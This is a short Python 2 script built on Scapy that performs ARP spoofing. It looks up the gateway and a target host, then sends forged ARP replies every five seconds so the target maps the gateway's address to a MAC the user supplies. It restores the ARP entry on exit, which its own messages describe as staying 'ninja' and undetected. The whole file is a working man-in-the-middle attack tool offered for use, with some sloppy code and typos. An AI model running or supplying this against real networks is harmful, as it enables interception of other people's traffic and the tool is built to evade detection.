#!/usr/bin/env python2

from logging import getLogger
getLogger('scapy').setLevel(1)

from scapy.all import *
from time import sleep
import threading
from os import system
from sys import argv,exit

sniffon = "wlp3s0"

try:
    #pass
    new = argv[1]
    d2d = argv[2]
except:
    print "fail. supply mac address to redirect and host/ip"
    exit(1)

def gatizzle():
	print "fetching gateway"
	p = sr1(IP(dst="www.slashdot.org", ttl = 0)/ICMP()/"XXXXXXXXXXX")
	return p

print "[*] getting gateway ip"
gatta_ip = gatizzle().src
print "[*] gateway ip:%s" % gatta_ip

def icmpshizzle():
    cnt = 0
    while True:
        print "ICMP Sent"
        icmpans = sr1(IP(dst=d2d)/ICMP(),timeout=2)
        print "ICMP Recieved"
        try:
            icmpans.show()
            return icmpans.src
        except AttributeError:
            cnt += 1
            if cnt >= 4:
                print "exit me brah"
                return None
            print "did not find. x%d" % cnt
   #if got to here, did not find stuffz
    return None

def arpreqsnizzle(icmpansr):
    cnt = 0
    while True:
        print "ARP requiesting"
        ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/
            ARP(pdst=icmpansr),timeout=5)
        print "ARP asnwer recieved"
        try:
            print ans[0][1].show()
            target_mac = ans[0][1].hwsrc
            target_ip = ans[0][1].psrc
            return target_mac,target_ip
        except IndexError:
            cnt += 1
            if cnt >= 4:
                print "exit me brah"
                return None, None
            print "did not find x%d" % cnt
def buildizzle(tm,tp):
    global gateway_ip
    global gateway_mac
    global new

    poisin = ARP()
    poisin.op = 2
    poisin.hwsrc=new
    poisin.psrc=gateway_ip
    poisin.hwdst=tm
    poisin.pdst=tp

    poisin.show()
    return poisin

def poisinizzle(poisin):
    global gatway_mac
    print "ARP poisin sended"
    while True:
        try:
            send(poisin)
            sleep(5)
        except KeyboardInterrupt:
            print "ARPing stahped"
            print "reset ARP tables to remain ninja"
            poisin.hwsrc = gateway_mac
            poisin.show()
            send(poisin)
            print "ARP reset. ninja status retained"
            break

gateway_mac, gateway_ip= arpreqsnizzle(gatta_ip)  

icmpz = icmpshizzle()
if icmpz == None:
    print "could not find icmp"
    sys.exit(0)
tar_m, tar_i = arpreqsnizzle(icmpz)
if tar_m == None and tar_i == None:
    print "could not arp req"
    sys.exit(0)
pisin = buildizzle(tar_m,tar_i)
poisinizzle(pisin)

